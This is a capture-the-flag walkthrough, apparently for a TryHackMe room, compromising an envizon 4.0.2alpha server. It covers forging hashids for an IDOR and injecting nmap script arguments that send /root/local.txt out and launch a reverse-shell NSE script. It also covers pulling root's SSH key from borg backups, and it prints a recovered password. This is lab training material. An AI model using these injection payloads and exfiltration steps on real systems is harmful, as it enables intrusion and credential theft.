The room says we are using a framework software called `envizon` and its using version `4.0.2alpha` 

Started with a nmap scan
```
22 OpenSSH 7.6p1
3000 unknown HTTP server
```
When going to the website we need to use https to connect to the site and we get a login page so going to run a gobuster scan
```
/images
/admin
/reports
/issues
/groups
/clients
/notes
/404
```
seen a interesting folder called `notes` if we go to `/notes/1` we get a IDOR we can read the note it says they added `hashids` with a length of `30` and there is another note of id `380` but we cant view this note so going back to the other note we can see a edit button and gives us a link with what looks like names letters and then redirects us to the login its the `hashid` for note one so now we need to make a `hashid` for note `380` so now we need to make a `hashid` and a secret name of `Note` now if we take this id we can view the note we just need to take the `/edit` off and now we got the password for envizon `rE8Z*qyM!DTKNP8fGu4T3tW*aurBQwLF` now we can access the dashboard and we can see some THM boxs seeing how we can run scans maybe we can get command injection with nmap if we set a socat to receive the file and set the ip to scan as are host 
`-p 8080 --script http-get --script-args http-put,url=/,http-put.file=/root/local.txt` and now we have the local flag so now we need to get a reverse shell we can use a nse script you can find one of github we can use the same command but change it to fetch the script now the script is on  the machine we need to exacute it `-p 8000 --script /tmp/reverse_shell/10.13.8.255/8000/reverse_shell.nse` we need to use port `8080` to get the reverse shell we also need to start a listener on port `8000` as a fake port now we got a reverse shell as root but from this shell we need to use python3 to make a another connection to us on another port and now we can stabilize are shell and everything going with the hint from the room we might be looking for a backup folder and there is one `/var/backup` and looking at the README its a backup using `borgmatic` so looking for config files for a password and now found it in `/etc/borgmatic/config.yaml` so now we can use this to list backups `borg list /var/backup` and put the password in and now we have a `.ssh` and now we have the private key of `root` and we can copy it to are host and now we have can SSH into the real root account